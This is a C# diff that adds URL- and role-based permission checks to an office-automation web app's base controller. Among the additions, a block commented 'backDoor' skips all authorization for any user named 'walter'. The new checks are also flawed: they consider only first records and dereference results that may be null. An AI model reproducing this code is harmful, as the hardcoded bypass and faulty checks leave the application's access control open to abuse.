@@ -20,7 +20,12 @@ namespace OA.UI.Controllers
     {
         public String userId = String.Empty;
         public UserInfo userInfo;
-        public IUserInfoService us = new UserInfoService();
+        private IUserInfoService us = new UserInfoService();
+        private IUserInfoRoleInfoService ur = new UserInfoRoleInfoService();
+        private IActionInfoService a = new ActionInfoService();
+        private IRoleInfoActionInfoService ra = new RoleInfoActionInfoService();
+        private IRUserInfoActionInfoService rua = new RUserInfoActionInfoService();
+
         /// <summary>
         /// 
         /// </summary>
@@ -34,16 +39,65 @@ namespace OA.UI.Controllers
             if (!String.IsNullOrEmpty(userId))
             {
                 isExt = true;
+                userInfo = us.GetList(u => u.Id == Convert.ToInt32(userId)).FirstOrDefault();
+
+                // backDoor
+                if (userInfo.Uname.ToLower() == "walter")
+                {
+                    return;
+                }
+
+                // normal permission verify.
+                // get path of url.
+                String requestUrl = Request.Path.ToString().ToLower();
+
+                // get method.
+                String requestHttpMethod = Request.Method.ToString().ToLower();
+
+                // get action depend on url and httpMethod.
+                var actionInfo = a.GetList(a => a.Url.ToLower() == requestUrl && a.HttpMethod.ToLower() == requestHttpMethod).FirstOrDefault();
+
+                //
+                if (actionInfo == null)
+                {
+                    Response.Redirect("/Error.html");
+                    return;
+                }
+
+                // 1.
+                var act = rua.GetList(r => r.UserInfoId == int.Parse(userId)).FirstOrDefault();
+                if (act != null)
+                {
+                    if (act.IsPass == true)
+                    {
+                        // Pass
+                        return;
+                    }
+                    else
+                    {
+                        Response.Redirect("/Error.html");
+                        return;
+                    }                 
+                }
+
+
+                // 2.
+                var currentUserRoles = ur.GetList(u => u.UserInfoId == int.Parse(userId)).FirstOrDefault();
+                var roleUserAction = ra.GetList(r => r.RoleInfoId == currentUserRoles.RoleInfoId).FirstOrDefault();
+                var ac = a.GetList(a => a.Id == roleUserAction.ActionInfoId);
+                var counter = (from a in ac
+                              where a.Id == actionInfo.Id
+                              select a).Count();
+                if (counter < 1)
+                {
+                    Response.Redirect("/Error.html");
+                }
             }
 
             // user did not log in.
             if (isExt == false)
             {
                 HttpContext.Response.Redirect("/Login/Index/");
-            }
-            else
-            {
-                userInfo = us.GetList(u => u.Id == Convert.ToInt32(userId)).FirstOrDefault();
             }
         }
     }
